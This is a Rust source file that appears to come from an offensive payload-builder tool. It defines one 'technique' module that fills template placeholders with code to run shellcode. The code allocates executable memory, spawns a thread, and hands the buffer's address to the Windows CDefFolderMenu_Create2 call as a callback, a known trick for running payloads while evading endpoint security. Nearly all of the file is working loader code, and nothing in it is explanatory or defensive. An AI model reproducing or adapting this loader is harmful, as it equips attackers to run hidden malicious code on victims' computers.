use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct CdefFolderMenu;

impl Technique for CdefFolderMenu {
    fn meta(&self) -> &'static TechniqueMeta { &CDEF_FOLDER_MENU_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");

        let helpers = r#"
unsafe extern "system" fn cdef_invoke(param: *mut winapi::ctypes::c_void) -> u32 {
    unsafe {
        windows_sys::Win32::System::Com::CoInitializeEx(
            std::ptr::null(),
            windows_sys::Win32::System::Com::COINIT_APARTMENTTHREADED as u32,
        );
        let callback: windows_sys::Win32::UI::Shell::LPFNDFMCALLBACK =
            Some(std::mem::transmute(param));
        let mut ppcm: *mut std::ffi::c_void = std::ptr::null_mut();
        windows_sys::Win32::UI::Shell::CDefFolderMenu_Create2(
            std::ptr::null(),
            std::ptr::null_mut(),
            0,
            std::ptr::null(),
            std::ptr::null_mut(),
            callback,
            0,
            std::ptr::null(),
            &mut ppcm,
        );
    }
    0
}
"#;
        ctx.set_replacement("{{INJECTION_HELPERS}}", helpers.to_string());

        let body = r#"
        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }
        let thread = winapi::um::processthreadsapi::CreateThread(
            null_mut(),
            0,
            Some(cdef_invoke),
            addr,
            0,
            null_mut(),
        );
        if !thread.is_null() {
            winapi::um::synchapi::WaitForSingleObject(thread, 0xFFFFFFFF);
        }
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::CDEF_FOLDER_MENU_META;
